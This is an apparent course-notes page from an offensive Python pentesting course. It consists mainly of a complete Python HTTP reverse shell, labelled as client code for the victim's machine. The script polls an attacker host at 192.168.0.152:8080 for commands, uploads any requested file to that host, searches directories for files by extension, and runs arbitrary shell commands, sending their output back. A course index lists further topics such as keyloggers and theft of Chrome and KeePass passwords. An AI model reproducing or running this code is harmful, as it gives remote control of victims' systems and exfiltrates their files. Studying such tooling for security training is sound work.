---
title: Coding a reverse shell that searches files
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - python
  - python pentesting
  - scripting
  - reverse shell
---

# Coding a reverse shell that searches files


From course: [Python For Offensive PenTest: A Complete Practical Course](https://www.udemy.com/course/python-for-offensive-security-practical-course/).

??? abstract "General index of the course"
	- Gaining persistence shells (TCP + HTTP):
		- [Coding a TCP connection and a reverse shell](coding-a-tcp-reverse-shell.md).
		- [Coding a low level data exfiltration  - TCP connection](coding-a-low-level-data-exfiltration-tcp.md).
		- [Coding an http reverse shell](coding-an-http-reverse-shell.md).
		- [Coding a data exfiltration script for a http shell](coding-a-data-exfiltration-script-http-shell.md).
		- [Tunning the connection attempts](tunning-the-connection-attemps.md).
		- [Including cd command into TCP reverse shell](including-cd-command-into-tcp-reverse-shell.md).
	- Advanced scriptable shells:
		- [Using a Dynamic DNS instead of your bared attacker public ip](ddns-aware-shell.md).
		- [Making your binary persistent](making-your-binary-persistent.md). 
		- [Making a screenshot](making-a-screenshot.md). 
		- [Coding a reverse shell that searches files](coding-a-reverse-shell-that-searches-files.md). 
	- Techniques for bypassing filters: 
		- [Coding a reverse shell that scans ports](coding-a-reverse-shell-that-scans-ports.md). 
		- [Hickjack the Internet Explorer process to bypass an host-based firewall](hickjack-internet-explorer-process-to-bypass-an-host-based-firewall).
		- [Bypassing Next Generation Firewalls](bypassing-next-generation-firewalls.md).
		- [Bypassing IPS with handmade XOR Encryption](bypassing-ips-with-handmade-xor-encryption.md).
	- Malware and crytography:
		- [TCP reverse shell with AES encryption](tcp-reverse-shell-with-aes-encryption.md).
		- [TCP reverse shell with RSA encryption](tcp-reverse-shell-with-rsa-encryption.md).
		- [TCP reverse shell with hybrid encryption AES + RSA](tcp-reverse-shell-with-hybrid-encryption-rsa-aes.md).
	- Password Hickjacking:
		- [Simple keylogger in python](python-keylogger.md).
		- [Hijacking Keepass Password Manager](hijacking-keepass.md).
		- [Dumping saved passwords from Google Chrome](dumping-chrome-saved-passwords.md).
		- [Man in the browser attack](man-in-the-browser-attack.md).
		- [DNS Poisoning](dns-poisoning.md).
	- Privilege escalation:
		- [Weak service file permission](privilege-escalation.md).


## Client side

To be run in the victim's machine.

```python

import requests
import os
import subprocess
import time

while True:
    req = requests.get('http://192.168.0.152:8080')
    command = req.text
    if 'terminate' in command:
        break
    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path):
            url = "http://192.168.0.152:8080/store"
            filer = {'file': open(path, 'rb')}
            r = requests.post(url, files=filer)
        else:
            post_response = requests.post(url='http://192.168.0.152:8080', data='[-] Not able to find the file!'.encode())
    elif 'search' in command: #The Formula is search <path>*.<file extension>  -->for example let's say that we got search C:\\*.pdf
        command = command[7:] #cut off the the first 7 character ,, output would be  C:\\*.pdf
        path, ext = command.split('*')
        lists = '' # here we define a string where we will append our result on it

#os.walk is a function that will naviagate ALL the directoies specified in the provided path and returns three values:-
#1-dirpath is a string contains the path to the directory
#2-dirnames is a list of the names of the subdirectories in  dirpath
#3-files is a list of the files name in dirpath

#Once we got the files list, we check each file (using for loop), if the file extension was matching what we are looking for, then we add the directory path into list string.



        for dirpath, dirname, files in os.walk(path):
           for file in files:
               if file.endswith(ext):
                   lists = lists + '\n' + os.path.join(dirpath, file)
        requests.post(url='http://192.168.0.152:8080', data=lists)
    else:
        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.0.152:8080', data=CMD.stderr.read())
    time.sleep(3)


```
